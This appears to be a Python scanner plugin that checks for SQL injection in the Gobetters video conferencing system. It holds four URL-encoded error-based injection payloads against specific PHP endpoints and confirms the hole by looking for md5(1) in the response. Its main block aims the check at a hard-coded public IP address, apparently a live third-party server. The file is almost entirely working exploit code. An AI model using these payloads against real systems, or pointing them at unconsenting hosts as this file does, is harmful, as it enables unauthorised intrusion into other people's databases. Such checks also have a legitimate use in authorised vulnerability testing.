#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:Gobetters视频会议系统SQL注入漏洞打包
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0134733


def assign(service,arg):
    if service=="gobetter":
        return True,arg 


def  audit(arg):
    ps=[
    
    "web/android/dept.php?lan=1&deptcode=1%27%20AND%20(SELECT%207173%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20%27ninq%27=%27ninq",
    "web/onelanding/onelanding.php?username=1&deptcode=1%27%20AND%20(SELECT%207173%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20%27ninq%27=%27ninq",
    "web/device/dept.php?deptcode=1%27%20AND%20(SELECT%207173%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20%27ninq%27=%27nin",
    "web/users/depttree.php?deptid=-7276%20OR%20ROW(1355,6771)>(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20(SELECT%208443%20UNION%20SELECT%205201%20UNION%20SELECT%203389%20UNION%20SELECT%202860)a%20GROUP%20BY%20x)",
    ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('gobetter','http://218.89.3.21:89/')[1])